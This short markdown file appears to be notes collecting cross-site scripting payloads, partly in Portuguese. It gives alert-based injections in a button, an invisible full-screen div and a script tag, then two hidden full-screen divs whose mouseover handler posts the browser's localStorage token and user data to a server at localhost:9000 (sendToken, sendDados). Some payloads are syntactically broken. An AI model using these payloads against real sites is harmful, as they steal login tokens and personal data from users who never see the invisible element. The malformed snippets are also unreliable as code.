
# Button
`<button onclick="Alert Hackeado">Click me</button>`

# On mouse over
`<div onmouseover="alert('injetado!')" style="width:100vw; height: 100vh; color:transparent"> </div>`

# Script
`<script>alert('123')</script>`
 
# Request HTTP
`<div onmouseover="axios.post('http://localhost:9000/sendToken', {}, {headers:{Authorization:localStorage['token']} }).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`


`<div onmouseover="axios.post('http://localhost:9000/sendDados', {}, {headers: 'Content-Type': 'application/json',},body: JSON.stringify(users),}).then((result)=>{})" style="width:100vw; height: 100vh; color:transparent"></div>`








